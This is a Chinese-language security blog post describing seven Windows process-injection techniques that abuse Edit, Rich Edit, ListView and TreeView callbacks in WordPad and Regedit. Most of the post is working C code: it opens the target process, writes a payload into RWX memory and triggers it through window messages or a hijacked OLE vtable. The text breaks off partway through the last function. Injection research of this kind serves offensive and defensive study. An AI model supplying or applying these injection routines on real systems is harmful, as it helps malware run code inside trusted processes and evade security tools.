<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Windows进程注入的7中方法 | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":"search.json"}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(/img/bg.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>Windows进程注入的7中方法</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-11-02T05:28:50.000Z" id="date"> 2022-11-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-11-11T04:20:39.153Z" id="updated"> 2022-11-11</time></div></span><br><span>Word Count: <div class="control">2.8k</div></span><br><span>Read Time: <div class="control">12 min</div></span></div></div><hr><div id="post-content"><h1 id="Windows进程注入的7中方法"><a href="#Windows进程注入的7中方法" class="headerlink" title="Windows进程注入的7中方法"></a>Windows进程注入的7中方法</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p>在本文中，我们将具体讨论这些新型注入方法，并提供一些可用的示例。前五种方法的示例都将使用“Edit”和“Rich Edit”控件，最后两个则使用SysListView32和SysTreeView32。</p>
<h2 id="关于Rich-Edit控件"><a href="#关于Rich-Edit控件" class="headerlink" title="关于Rich Edit控件"></a><strong>关于Rich Edit控件</strong></h2><p>要进行新型注入方法的尝试，我们可以选择遍历所有窗口，例如EnumWindows，从窗口句柄中检索类的名称，然后将字符串的开始部分与“RICHEDIT”进行比较。除了这种方法之外，我们还可以使用FindWindow或FindWindowEX手动查找这些空间。我们所使用的环境是Windows 10的评估版本，因此我进行测试时使用的唯一应用程序就是Wordpad（写字板），并找到其中的富文本控件Rich Edit Control。要完成这一过程，只需要两行代码。</p>
<p>\1. 获取Wordpad的主窗口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wpw = FindWindow(<span class="hljs-string">L&quot;WordPadClass&quot;</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<p>\2. 找到Rich Edit控件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rew = FindWindowEx(wpw, <span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;RICHEDIT50W&quot;</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<h2 id="方法1：WordWarping"><a href="#方法1：WordWarping" class="headerlink" title="方法1：WordWarping"></a><strong>方法1：WordWarping</strong></h2><p>可以使用EM_SETWORDBREAKPROC消息来设置Edit或Rich Edit空间的文本包装器回调函数。通过SendInput或PostMessage API模拟键盘输入，可以触发回调函数的执行。这种注入方式在16年前就已经被用于在应用程序中提升特权。尽管没有针对该漏洞的CVE编号，但实际上，它可以被用于针对McAfee、VirusScan、Sygate Personal Firewall Pro、WinVNC、Dameware以及其他产品的漏洞利用。示例中的代码，就使用了WordPad实现注入代码，其具体步骤如下：</p>
<p>\1. 获取Wordpad的主窗口；</p>
<p>\2. 找到Wordpad的Rich Edit控件；</p>
<p>\3. 尝试获取Wordwrap函数的当前地址；</p>
<p>\4. 获取Wordpad的进程ID；</p>
<p>\5. 尝试打开该进程；</p>
<p>\6. 为Payload分配RWX内存；</p>
<p>\7. 将Payload写入内存；</p>
<p>\8. 更新回调过程；</p>
<p>\9. 模拟键盘输入，以触发Payload；</p>
<p>\10. 恢复原始Wordwrap功能（如果存在）；</p>
<p>\11. 释放内存并关闭进程句柄。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">wordwarping</span><span class="hljs-params">(LPVOID payload, DWORD payloadSize)</span> &#123;<br>    HANDLE        hp;<br>    DWORD         id;<br>    HWND          wpw, rew;<br>    LPVOID        cs, wwf;<br>    SIZE_T        rd, wr;<br>    INPUT         ip;<br>   <br>    <span class="hljs-comment">// 1. Get main window for wordpad.</span><br>    <span class="hljs-comment">//    This will accept simulated keyboard input.</span><br>    wpw = FindWindow(<span class="hljs-string">L&quot;WordPadClass&quot;</span>, <span class="hljs-literal">NULL</span>);<br>   <br>    <span class="hljs-comment">// 2. Find the rich edit control for wordpad.</span><br>    rew = FindWindowEx(wpw, <span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;RICHEDIT50W&quot;</span>, <span class="hljs-literal">NULL</span>);<br> <br>    <span class="hljs-comment">// 3. Try get current address of Wordwrap function</span><br>    wwf = (LPVOID)SendMessage(rew, EM_GETWORDBREAKPROC, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br> <br>    <span class="hljs-comment">// 4. Obtain the process id for wordpad.</span><br>    GetWindowThreadProcessId(rew, &amp;id);<br> <br>    <span class="hljs-comment">// 5. Try open the process.</span><br>    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);<br> <br>    <span class="hljs-comment">// 6. Allocate RWX memory for the payload.</span><br>    cs = VirtualAllocEx(hp, <span class="hljs-literal">NULL</span>, payloadSize,<br>        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br> <br>    <span class="hljs-comment">// 7. Write the payload to memory</span><br>    WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);<br> <br>    <span class="hljs-comment">// 8. Update the callback procedure</span><br>    SendMessage(rew, EM_SETWORDBREAKPROC, <span class="hljs-number">0</span>, (LPARAM)cs);<br> <br>    <span class="hljs-comment">// 9. Simulate keyboard input to trigger payload</span><br>    ip.type           = INPUT_KEYBOARD;<br>    ip.ki.wVk         = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    ip.ki.wScan       = <span class="hljs-number">0</span>;<br>    ip.ki.dwFlags     = <span class="hljs-number">0</span>;<br>    ip.ki.time        = <span class="hljs-number">0</span>;<br>    ip.ki.dwExtraInfo = <span class="hljs-number">0</span>;<br>   <br>    SetForegroundWindow(rew);<br>    SendInput(<span class="hljs-number">1</span>, &amp;ip, <span class="hljs-keyword">sizeof</span>(ip));<br> <br>    <span class="hljs-comment">// 10. Restore original Wordwrap function (if any)</span><br>    SendMessage(rew, EM_SETWORDBREAKPROC, <span class="hljs-number">0</span>, (LPARAM)wwf);<br>   <br>    <span class="hljs-comment">// 11. Free memory and close process handle</span><br>    VirtualFreeEx(hp, cs, <span class="hljs-number">0</span>, MEM_DECOMMIT | MEM_RELEASE);<br>    CloseHandle(hp);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="方法2：Hyphentension"><a href="#方法2：Hyphentension" class="headerlink" title="方法2：Hyphentension"></a><strong>方法2：Hyphentension</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagHyphenateInfo</span> &#123;</span><br>  SHORT cbSize;<br>  SHORT dxHyphenateZone;<br>  <span class="hljs-type">void</span>((WCHAR *,LANGID, <span class="hljs-type">long</span>,HYPHRESULT *) * )pfnHyphenate;<br>&#125; HYPHENATEINFO;<br></code></pre></td></tr></table></figure>

<p>可以通过发送带有指向HYPHENATEINFO结构的指针的EM_GETHYPHENATEINFO消息，来获取有关Rich Edit空间Hyphenation信息。但是，该方法假定指向结构的指针是本地内存，因此攻击者必须在使用SendMessage或PostMessage发送EM_GETHYPHENATEINFO之前，借助VirtualAllocEx为信息分配内存。在使用EM_SETHYPHENATEINFO之前，可能需要设置Edit空间的排版（Typography）选项。尽管我们无法使用写字板实现这一点，但我们推测，诸如Microsoft Word这样功能丰富的文字处理器应该是可行的。</p>
<h2 id="方法3：AutoCourgette"><a href="#方法3：AutoCourgette" class="headerlink" title="方法3：AutoCourgette"></a><strong>方法3：AutoCourgette</strong></h2><p>根据MSDN上提供的信息，EM_SETAUTOCORRECTPROC消息所支持的客户端最低版本是Windows 8，因此它是一个相对较新的功能。写字板显然不支持自动校正，所以我无法实现该方法的利用。像第二种方法Hyphenation一样，这种方法可能会适用于Microsoft Word。</p>
<h2 id="方法4：Streamception"><a href="#方法4：Streamception" class="headerlink" title="方法4：Streamception"></a><strong>方法4：Streamception</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">editstream</span> &#123;</span><br>  DWORD_PTR          dwCookie;<br>  DWORD              dwError;<br>  EDITSTREAMCALLBACK pfnCallback;<br>&#125; EDITSTREAM;<br></code></pre></td></tr></table></figure>

<p>当Rich Edit空间收到EM_STREAMIN消息时，它使用EDITSTREAM结构中提供的信息，将数据流传入或传出控件。pfnCallback字段的类型为EDITSTREAMCALLBACK，可以指向内存中的Payload。我们确保EDITSTREAMCALLBACK会返回一个非零值，从而指示错误的存在，但最终，Rich Edit空间中的内容仍然会被删除。这一方法可以正常工作，但不会破坏现有的缓冲流。我们推测，可能有方法能够解决这一问题，但目前我们仍然在深入调查的过程中。</p>
<p>该方法的具体步骤如下：</p>
<p>\1. 获取窗口句柄；</p>
<p>\2. 获取进程ID并尝试打开进程；</p>
<p>\3. 分配RWX内存，并在该位置复制Payload；</p>
<p>\4. 分配RW内存，并在该位置复制EDITSTREAM结构；</p>
<p>\5. 使用EM_STREAMIN触发Payload；</p>
<p>\6. 释放内存并关闭进程句柄。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs text">VOID streamception(LPVOID payload, DWORD payloadSize) &#123;<br>    HANDLE        hp;<br>    DWORD         id;<br>    HWND          wpw, rew;<br>    LPVOID        cs, ds;<br>    SIZE_T        rd, wr;<br>    EDITSTREAM    es;<br>   <br>    // 1. Get window handles<br>    wpw = FindWindow(L&quot;WordPadClass&quot;, NULL);<br>    rew = FindWindowEx(wpw, NULL, L&quot;RICHEDIT50W&quot;, NULL);<br>   <br>    // 2. Obtain the process id and try to open process<br>    GetWindowThreadProcessId(rew, &amp;id);<br>    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);<br> <br>    // 3. Allocate RWX memory and copy the payload there.<br>    cs = VirtualAllocEx(hp, NULL, payloadSize,<br>        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br> <br>    WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);<br> <br>    // 4. Allocate RW memory and copy the EDITSTREAM structure there.<br>    ds = VirtualAllocEx(hp, NULL, sizeof(EDITSTREAM),<br>        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>       <br>    es.dwCookie    = 0;<br>    es.dwError     = 0;<br>    es.pfnCallback = cs;<br>   <br>    WriteProcessMemory(hp, ds, &amp;es, sizeof(EDITSTREAM), &amp;wr);<br>   <br>    // 5. Trigger payload with EM_STREAMIN<br>    SendMessage(rew, EM_STREAMIN, SF_TEXT, (LPARAM)ds);<br> <br>    // 6. Free memory and close process handle<br>    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);<br>    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);<br>    CloseHandle(hp);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="方法5：Oleum"><a href="#方法5：Oleum" class="headerlink" title="方法5：Oleum"></a><strong>方法5：Oleum</strong></h2><p>在完成前四个方法的研究之后，我开始研究EM_SETOLECALLBACK这个潜在的方法。大概是在同一时间，Adam也更新了他的博客，说发现了这一方法。EM_GETOLECALLBACK消息似乎没有很好地进行记录，如果LPARAM没有指向本地可访问的内存，当发送到带有SendMessage的Rich Edit窗口时，将会发生崩溃。此外，EM_GETOLECALLBACK没有按预期返回指向IRichEditOleCallback的指针，它返回了一个指向IRichEditOle的指针。因此，我没有使用EM_SETOLECALLBACK。相反，保存IRichEditOle.lpVtbl的堆内存将被一个地址覆盖到原始表的副本，其中一个方法指向Payload，在我们的示例中具体是GetClipboardData。</p>
<p>由于虚拟函数表仅位于只读内存中，所以我们无法实现对它的覆盖。也许有读者会说，可以在更改内存保护后实现对其的覆盖，但我并不推荐这种方法。我们可以制作副本，更新一个条目，并简单地重定向执行，这样可能会更有意义。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">typedef struct _IRichEditOle_t &#123;<br>    ULONG_PTR QueryInterface;<br>    ULONG_PTR AddRef;<br>    ULONG_PTR Release;<br>    ULONG_PTR GetClientSite;<br>    ULONG_PTR GetObjectCount;<br>    ULONG_PTR GetLinkCount;<br>    ULONG_PTR GetObject;<br>    ULONG_PTR InsertObject;<br>    ULONG_PTR ConvertObject;<br>    ULONG_PTR ActivateAs;<br>    ULONG_PTR SetHostNames;<br>    ULONG_PTR SetLinkAvailable;<br>    ULONG_PTR SetDvaspect;<br>    ULONG_PTR HandsOffStorage;<br>    ULONG_PTR SaveCompleted;<br>    ULONG_PTR InPlaceDeactivate;<br>    ULONG_PTR ContextSensitiveHelp;<br>    ULONG_PTR GetClipboardData;<br>    ULONG_PTR ImportDataObject;<br>&#125; _IRichEditOle;<br></code></pre></td></tr></table></figure>

<p>下面的代码中，使用WordPad作为示例，因为我在使用EM_SETOLECALLBACK消息的Windows的评估版本上找不到任何其他可以使用的应用程序。该过程会将Payload的地址替换为GetClipboardData的地址，然后将WM_COPY发送到Rich Edit窗口。</p>
<p>具体步骤如下：</p>
<p>\1. 获取窗口句柄；</p>
<p>\2. 获取进程ID并尝试打开进程；</p>
<p>\3. 分配RWX内存，并在该位置复制Payload；</p>
<p>\4. 为当前地址分配RW内存；</p>
<p>\5. 查询界面；</p>
<p>\6. 读取内存地址；</p>
<p>\7. 读取IRichEditOle.lpVtbl；</p>
<p>\8. 读取虚拟函数表；</p>
<p>\9. 为虚拟函数表的副本分配内存；</p>
<p>\10. 将GetClipboardData方法设置为Payload的地址；</p>
<p>\11. 将新的虚拟函数表写入远程内存；</p>
<p>\12. 更新IRichEditOle.lpVtbl；</p>
<p>\13. 通过调用GetClipboardData方法触发Payload；</p>
<p>\14. 恢复IRichEditOle.lpVtbl的原始值；</p>
<p>\15. 释放内存并关闭进程句柄。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs text">VOID oleum(LPVOID payload, DWORD payloadSize) &#123;<br>    HANDLE                hp;<br>    DWORD                 id;<br>    HWND                  rew;<br>    LPVOID                cs, ds, ptr, mem, tbl;<br>    SIZE_T                rd, wr;<br>    _IRichEditOle         reo;<br>   <br>    // 1. Get the window handle<br>    rew = FindWindow(L&quot;WordPadClass&quot;, NULL);<br>    rew = FindWindowEx(rew, NULL, L&quot;RICHEDIT50W&quot;, NULL);<br>   <br>    // 2. Obtain the process id and try to open process<br>    GetWindowThreadProcessId(rew, &amp;id);<br>    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);<br> <br>    // 3. Allocate RWX memory and copy the payload there<br>    cs = VirtualAllocEx(hp, NULL, payloadSize,<br>      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>     <br>    WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);<br>   <br>    // 4. Allocate RW memory for the current address<br>    ptr = VirtualAllocEx(hp, NULL, sizeof(ULONG_PTR),<br>      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>     <br>    // 5. Query the interface<br>    SendMessage(rew, EM_GETOLEINTERFACE, 0, (LPARAM)ptr);<br>   <br>    // 6. Read the memory address<br>    ReadProcessMemory(hp, ptr, &amp;mem, sizeof(ULONG_PTR), &amp;wr);<br> <br>    // 7. Read IRichEditOle.lpVtbl<br>    ReadProcessMemory(hp, mem, &amp;tbl, sizeof(ULONG_PTR), &amp;wr);<br> <br>    // 8. Read virtual function table<br>    ReadProcessMemory(hp, tbl, &amp;reo, sizeof(_IRichEditOle), &amp;wr);<br> <br>    // 9. Allocate memory for copy of virtual table<br>    ds = VirtualAllocEx(hp, NULL, sizeof(_IRichEditOle),<br>      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>     <br>    // 10. Set the GetClipboardData method to address of payload<br>    reo.GetClipboardData = (ULONG_PTR)cs;<br>   <br>    // 11. Write new virtual function table to remote memory<br>    WriteProcessMemory(hp, ds, &amp;reo, sizeof(_IRichEditOle), &amp;wr);<br>   <br>    // 12. update IRichEditOle.lpVtbl<br>    WriteProcessMemory(hp, mem, &amp;ds, sizeof(ULONG_PTR), &amp;wr);<br>   <br>    // 13. Trigger payload by invoking the GetClipboardData method<br>    PostMessage(rew, WM_COPY, 0, 0);<br>   <br>    // 14. Restore original value of IRichEditOle.lpVtbl<br>    WriteProcessMemory(hp, mem, &amp;tbl, sizeof(ULONG_PTR), &amp;wr);<br>   <br>    // 15. Free memory and close process handle<br>    VirtualFreeEx(hp, ptr,0, MEM_DECOMMIT | MEM_RELEASE);<br>    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);<br>    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);<br>   <br>    CloseHandle(hp);  <br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="方法6：ListPlanting"><a href="#方法6：ListPlanting" class="headerlink" title="方法6：ListPlanting"></a><strong>方法6：ListPlanting</strong></h2><p>可以使用LVM_SORTGROUPS、LVM_INSERTGROUPSORTED和LVM_SORTITEMS消息，自定义ListView控件中的项目&#x2F;组。以下结构将用于LVM_INSERTGROUPSORTED。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagLVINSERTGROUPSORTED</span> &#123;</span><br>  PFNLVGROUPCOMPARE pfnGroupCompare;<br>  <span class="hljs-type">void</span>              *pvData;<br>  LVGROUP           lvGroup;<br>&#125; LVINSERTGROUPSORTED, *PLVINSERTGROUPSORTED;<br></code></pre></td></tr></table></figure>

<p>下面的代码中，使用注册表编辑器和LVM_SORTITEMS来触发Payload。在这里，存在一个问题，就是这一过程会为列表中的每一项调用回调函数。如果列表中没有项目，那么根本不会调用该函数。实际上，我们可以想办法解决这一问题，例如检查列表中有多少项目、添加项目、删除项目、使用传递给回调函数的参数等。</p>
<p>具体步骤如下：</p>
<p>\1. 获取窗口句柄；</p>
<p>\2. 获取进程ID并尝试打开进程；</p>
<p>\3. 分配RWX内存并在该位置复制Payload；</p>
<p>\4. 触发Payload；</p>
<p>\5. 释放内存并关闭进程句柄。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">listplanting</span><span class="hljs-params">(LPVOID payload, DWORD payloadSize)</span> &#123;<br>    HANDLE        hp;<br>    DWORD         id;<br>    HWND          lvm;<br>    LPVOID        cs;<br>    SIZE_T        wr;<br>   <br>    <span class="hljs-comment">// 1. get the window handle</span><br>    lvm = FindWindow(<span class="hljs-string">L&quot;RegEdit_RegEdit&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    lvm = FindWindowEx(lvm, <span class="hljs-number">0</span>, <span class="hljs-string">L&quot;SysListView32&quot;</span>, <span class="hljs-number">0</span>);<br>  <br>    <span class="hljs-comment">// 2. Obtain the process id and try to open process</span><br>    GetWindowThreadProcessId(lvm, &amp;id);<br>    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);<br> <br>    <span class="hljs-comment">// 3. Allocate RWX memory and copy the payload there.</span><br>    cs = VirtualAllocEx(hp, <span class="hljs-literal">NULL</span>, payloadSize,<br>        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br> <br>    WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);<br>   <br>    <span class="hljs-comment">// 4. Trigger payload</span><br>    PostMessage(lvm, LVM_SORTITEMS, <span class="hljs-number">0</span>, (LPARAM)cs);<br>   <br>    <span class="hljs-comment">// 5. Free memory and close process handle</span><br>    VirtualFreeEx(hp, cs, <span class="hljs-number">0</span>, MEM_DECOMMIT | MEM_RELEASE);<br>    CloseHandle(hp);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="方法7：Treepoline"><a href="#方法7：Treepoline" class="headerlink" title="方法7：Treepoline"></a><strong>方法7：Treepoline</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagTVSORTCB</span> &#123;</span><br>  HTREEITEM    hParent;<br>  PFNTVCOMPARE lpfnCompare;<br>  LPARAM       lParam;<br>&#125; TVSORTCB, *LPTVSORTCB;<br></code></pre></td></tr></table></figure>

<p>可以通过TVM_SORTCHILDRENCB消息实现自定义排序。对于每个项目，将会执行Payload，因此还需要进行额外检查，以避免运行多个实例。在获取TreeListView窗口句柄后，我们需要做的第一件事情是获取根项目。在调用回调函数之前，我们就需要其中的一个项目。</p>
<p>具体步骤如下：</p>
<p>\1. 获取treeview句柄；</p>
<p>\2. 获取进程ID并尝试打开进程；</p>
<p>\3. 分配RWX内存，并在该位置复制Payload；</p>
<p>\4. 获取树列表中的根项目；</p>
<p>\5. 分配RW内存，并复制TVSORTCB结构；</p>
<p>\6. 触发Payload；</p>
<p>\7. 释放内存并关闭进程句柄。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// requires elevated privileges</span><br>VOID <span class="hljs-title function_">treepoline</span><span class="hljs-params">(LPVOID payload, DWORD payloadSize)</span> &#123;<br>    HANDLE        hp;<br>    DWORD         id;<br>    HWND          wpw, tlv;<br>    LPVOID        cs, ds, item;<br>    SIZE_T        rd, wr;<br>    TVSORTCB      tvs;<br>   <br>    <span class="hljs-comment">// 1. get the treeview handle</span><br>    wpw = FindWindow(<span class="hljs-string">L&quot;RegEdit_RegEdit&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    tlv = FindWindowEx(wpw, <span class="hljs-number">0</span>, <span class="hljs-string">L&quot;SysTreeView32&quot;</span>, <span class="hljs-number">0</span>);<br>   <br>    <span class="hljs-comment">// 2. Obtain the process id and try to open process</span><br>    GetWindowThreadProcessId(tlv, &amp;id);<br>    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);<br> <br>    <span class="hljs-comment">// 3. Allocate 